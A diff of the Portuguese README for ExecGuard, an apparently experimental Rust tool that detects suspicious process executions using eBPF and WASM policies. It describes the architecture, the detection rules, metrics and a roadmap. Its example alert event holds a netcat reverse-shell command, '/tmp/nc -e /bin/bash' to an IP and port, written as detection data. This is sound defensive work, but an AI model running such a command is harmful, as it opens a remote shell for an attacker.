@@ -1,120 +1,168 @@
 ExecGuard
 
-ExecGuard é uma plataforma experimental de detecção de ameaças construída em Rust que combina eBPF para observabilidade kernel-level com WebAssembly (WASM) para execução segura de políticas de segurança em runtime.
+Runtime Security Pipeline combinando eBPF para observabilidade kernel-level e WebAssembly (WASM) para execução segura de políticas em tempo real.
 
-O projeto explora uma arquitetura moderna inspirada em agentes EDR, onde a captura de eventos do sistema operacional é desacoplada da lógica de detecção através de módulos WASM carregados dinamicamente.
+Visão Geral
+
+ExecGuard demonstra uma arquitetura moderna para detecção de comportamento suspeito em sistemas Linux.
+
+O pipeline captura eventos de execução de processos através de eBPF, processa os eventos em userspace utilizando Rust e aplica políticas de segurança isoladas em módulos WebAssembly.
 
 Objetivos
-Capturar eventos de execução de processos diretamente do kernel usando eBPF
-Processar eventos em userspace com baixo overhead
-Executar regras de detecção em sandbox WASM
-Permitir atualização de políticas sem recompilar o agente
-Demonstrar integração entre Linux Observability, Runtime Security e WebAssembly
+Captura de eventos execve em nível de kernel
+Pipeline extensível baseado em WASM
+Isolamento seguro das regras de detecção
+Baixa latência por evento
+Hot-swap de políticas sem recompilar o agente
 Arquitetura
-┌─────────────────────────────────────────────────────────────┐
-│                       KERNEL SPACE                          │
-├─────────────────────────────────────────────────────────────┤
-│ eBPF (Aya)                                                  │
-│ • tracepoints                                               │
-│ • syscall monitoring                                        │
-│ • event collection                                          │
-└───────────────────────┬─────────────────────────────────────┘
-                        │
-                        ▼
-┌─────────────────────────────────────────────────────────────┐
-│                     USERSPACE AGENT                         │
-├─────────────────────────────────────────────────────────────┤
-│ Aya Loader                                                  │
-│ • ring buffer consumer                                      │
-│ • event normalization                                       │
-│ • async processing                                          │
-└───────────────────────┬─────────────────────────────────────┘
-                        │
-                        ▼
-┌─────────────────────────────────────────────────────────────┐
-│                    WASM POLICY ENGINE                       │
-├─────────────────────────────────────────────────────────────┤
-│ Wasmtime Runtime                                            │
-│ • enrich                                                    │
-│ • correlate                                                 │
-│ • score                                                     │
-│ • alert generation                                          │
-└───────────────────────┬─────────────────────────────────────┘
-                        │
-                        ▼
-┌─────────────────────────────────────────────────────────────┐
-│                      OUTPUT LAYER                           │
-├─────────────────────────────────────────────────────────────┤
-│ JSON Events                                                 │
-│ Security Alerts                                             │
-│ Metrics                                                     │
-└─────────────────────────────────────────────────────────────┘
-Principais Características
-Runtime Security
+┌────────────────────┐
+│     Linux Kernel   │
+│     Tracepoints    │
+└─────────┬──────────┘
+          │
+          ▼
+┌────────────────────┐
+│     eBPF Probe     │
+│       (Aya)        │
+└─────────┬──────────┘
+          │
+          ▼
+┌────────────────────┐
+│   Rust Loader      │
+│ Async Event Stream │
+└─────────┬──────────┘
+          │
+          ▼
+┌────────────────────┐
+│   WASM Runtime     │
+│    (Wasmtime)      │
+└─────────┬──────────┘
+          │
+          ▼
+┌────────────────────┐
+│ Policy Evaluation  │
+│ Risk Scoring       │
+│ Correlation        │
+└─────────┬──────────┘
+          │
+          ▼
+┌────────────────────┐
+│ JSON Alerts        │
+│ Security Events    │
+└────────────────────┘
+Componentes
+execguard/
+├── execguard-agent/
+│   ├── src/
+│   └── execguard.wasm
+│
+├── execguard-wasm/
+│   └── src/
+│
+├── execguard-ebpf-real/
+│   ├── execguard-ebpf/
+│   ├── execguard-common/
+│   └── src/
+│
+├── scripts/
+│   ├── build.sh
+│   └── test.sh
+│
+└── docs/
+    └── LIMITACAO_WSL.md
+Pipeline de Processamento
+Event
+  │
+  ▼
+Enrichment
+  │
+  ▼
+Correlation
+  │
+  ▼
+Policy Evaluation
+  │
+  ▼
+Risk Scoring
+  │
+  ▼
+Alert Generation
+Regras Implementadas
+Regra	Severidade	Descrição
+BANNED_BINARY	10	Execução de binários proibidos
+TMP_EXECUTION	7	Execução em /tmp
+COMM_MISMATCH	5	Processo difere do executável
+REVERSE_SHELL	9	Indicadores de shell reversa
+Exemplo de Evento
+{
+  "pid": 1234,
+  "uid": 1000,
+  "comm": "bash",
+  "file": "/tmp/nc -e /bin/bash 192.168.1.100 4444",
+  "risk_score": 10
+}
+Performance
+Métrica	Valor
+Latência WASM	50–130 µs
+Throughput	> 10k eventos/s
+Heap WASM	64 KB
+Binário WASM	~15 KB
+Stack Tecnológica
+Tecnologia	Papel
+Rust	Runtime principal
+eBPF	Captura kernel-level
+Aya	Framework eBPF
+WebAssembly	Sandbox de políticas
+Wasmtime	Runtime WASM
+Tokio	Processamento assíncrono
+Serde	Serialização
+Quick Start
+Build
+git clone https://github.com/seu-usuario/execguard.git
 
-Detecção baseada em comportamento de processos:
+cd execguard
 
-Execução de binários proibidos
-Execução em diretórios temporários
-Inconsistência entre processo e executável
-Padrões de reverse shell
-Scoring de risco em tempo real
-WASM-Based Detection Engine
+./scripts/build.sh
+Executar Simulação
+cd execguard-agent
 
-A lógica de detecção é executada dentro de módulos WebAssembly:
-
-Isolamento de memória
-Atualização independente do agente
-Portabilidade
-Extensibilidade por plugins
-Rust End-to-End
-
-Todo o pipeline é implementado em Rust:
-
-Memory safety
-Concorrência segura
-Baixa latência
-Overhead reduzido
-Estado Atual
+cargo run --release
+Status do Projeto
 Componente	Status
-WASM Policy Engine	✅ Funcional
-Runtime Wasmtime	✅ Funcional
-Event Processing	✅ Funcional
-Threat Scoring	✅ Funcional
-eBPF Program	✅ Compila
-Aya Loader	✅ Compila
-eBPF Runtime Validation	⏳ Requer Linux nativo
-Hot Reload WASM	🚧 Planejado
-Persistent State	🚧 Planejado
-Benchmark Suite	🚧 Planejado
+WASM Policy Engine	✅
+Runtime Wasmtime	✅
+Event Simulation	✅
+eBPF Probe Build	✅
+Aya Loader Build	✅
+Pipeline eBPF → WASM	⚠️ Linux Nativo
+Produção Linux	🔄
+Limitações Conhecidas
+
+O ambiente WSL2 não fornece suporte completo para tracepoints e recursos necessários ao runtime eBPF.
+
+O projeto foi validado em modo de simulação e requer Linux nativo para execução completa do pipeline kernel → userspace → WASM.
+
+Detalhes em:
+
+docs/LIMITACAO_WSL.md
 Roadmap
-Fase 1
-eBPF real em Linux nativo
-Ring buffer pipeline completo
-Integração eBPF → WASM
-Fase 2
-Persistência com RocksDB
-Correlação temporal
-Histórico de processos
-Fase 3
-Hot-swap de módulos WASM
-Policy marketplace
-Regras carregadas dinamicamente
-Fase 4
-Exportação Prometheus
-Dashboard Grafana
-Integração SIEM
-Tecnologias
-Rust
-eBPF
-Aya
-Wasmtime
-WebAssembly
-Tokio
-Serde
-Linux Tracepoints
-Resultados Iniciais
-Latência WASM: ~50–130 µs
-Módulo WASM: ~15 KB
-Heap WASM: 64 KB
-Throughput estimado: >10k eventos/s
+Runtime
+ Pipeline eBPF → WASM completo
+ Hot Reload de módulos WASM
+ Policy Registry
+Correlação
+ RocksDB State Store
+ Correlation Engine
+ Session Tracking
+Observabilidade
+ Prometheus Metrics
+ OpenTelemetry
+ Grafana Dashboards
+Segurança
+ Threat Intelligence Feeds
+ IOC Matching
+ YARA Integration
+Licença
+
+MIT
+
